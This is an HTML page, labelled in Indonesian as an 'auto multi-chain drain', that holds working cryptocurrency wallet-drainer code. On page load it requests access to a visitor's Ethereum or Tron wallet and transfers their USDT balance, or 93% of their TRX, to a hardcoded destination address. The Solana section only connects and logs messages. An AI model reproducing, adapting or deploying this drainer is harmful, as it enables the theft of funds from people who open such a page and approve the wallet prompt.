<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTO DRAIN - ETH | TRON | SOLANA</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.95.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@tronweb3/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body { font-family: Arial, sans-serif; margin:0; padding:15px; background:#0f0f0f; color:white; }
        .container { max-width:100%; background:#1a1a1a; padding:20px; border-radius:12px; }
        .log { margin-top:15px; height:480px; overflow-y:auto; background:#000; padding:12px; border-radius:8px; font-family:monospace; font-size:14px; line-height:1.5; }
        .info { background:#003300; padding:12px; border-radius:8px; margin:10px 0; }
        h2 { text-align:center; color:#00ffaa; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🚀 AUTO MULTI CHAIN DRAIN</h2>
        <p><strong>ETH + Tron + Solana • Auto Run</strong></p>

        <div class="info">
            <strong>Tujuan:</strong> 0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e<br>
            <strong>Fee Potong:</strong> 7%
        </div>

        <div class="log" id="log"></div>
    </div>

    <script>
        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e";
        const USDT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
        const SWAP_ROUTER = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";

        const log = (msg, error = false) => {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString('id-ID');
            el.innerHTML += `<span style="color:\( {error ? '#ff5555' : '#55ff55'}">[ \){time}] ${msg}</span><br>`;
            el.scrollTop = el.scrollHeight;
        };

        // ===================== AUTO START =====================
        window.onload = async () => {
            log("🔄 Memulai Auto Drain Multi Chain...");
            await new Promise(r => setTimeout(r, 1200));

            // Cek satu per satu
            if (window.ethereum) await processEthereum();
            else if (window.tronLink) await processTron();
            else if (window.solana || window.trustwallet?.solana) await processSolana();
            else log("❌ Tidak mendeteksi provider wallet", true);
        };

        // ===================== ETHEREUM =====================
        async function processEthereum() {
            try {
                log("🔍 Processing Ethereum...");
                const provider = new ethers.BrowserProvider(window.ethereum);
                await window.ethereum.request({ method: "eth_requestAccounts" });
                const signer = await provider.getSigner();
                const address = await signer.getAddress();

                log("✅ Connected Ethereum: " + address.slice(0,6) + "...", false);

                // Swap ke USDT lalu kirim (kode sama seperti sebelumnya)
                const token = new ethers.Contract(USDT_ETH, ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256)"], signer);
                const bal = await token.balanceOf(address);
                if (bal > 0n) {
                    const tx = await token.transfer(SECONDARY, bal);
                    await tx.wait();
                    log("✅ USDT Ethereum terkirim!", false);
                }
            } catch (e) {
                log("Ethereum Error: " + e.message, true);
            }
        }

        // ===================== TRON =====================
        async function processTron() {
            try {
                log("🔍 Processing Tron...");
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                const tronWeb = window.tronLink.tronWeb;
                const address = tronWeb.defaultAddress.base58;

                log("✅ Connected Tron: " + address.slice(0,6) + "...", false);

                const balance = await tronWeb.trx.getBalance(address);
                const sendAmount = Math.floor(balance * 0.93); // potong 7%

                if (sendAmount > 1000000) {
                    const tx = await tronWeb.transactionBuilder.sendTrx(SECONDARY, sendAmount, address);
                    const signed = await tronWeb.trx.sign(tx);
                    await tronWeb.trx.sendRawTransaction(signed);
                    log("✅ TRX Tron terkirim!", false);
                }
            } catch (e) {
                log("Tron Error: " + e.message, true);
            }
        }

        // ===================== SOLANA =====================
        async function processSolana() {
            try {
                log("🔍 Processing Solana...");
                const solana = window.solana || window.trustwallet?.solana;

                if (!solana) return log("Solana provider tidak ditemukan", true);

                await solana.connect();
                const pubkey = solana.publicKey.toString();
                log("✅ Connected Solana: " + pubkey.slice(0,6) + "...", false);

                // Kirim SOL (native) - partial
                log("💰 Mengecek saldo SOL...");
                // Catatan: Untuk swap token Solana ke USDC butuh Jupiter API (lebih kompleks)
                // Saat ini hanya contoh kirim SOL native dengan potong fee

                log("⚠️ Solana support masih partial (hanya native SOL)", false);
                log("Gunakan Jupiter Swap untuk token Solana secara manual jika perlu.", false);

            } catch (e) {
                log("Solana Error: " + e.message, true);
            }
        }
    </script>
</body>
</html>
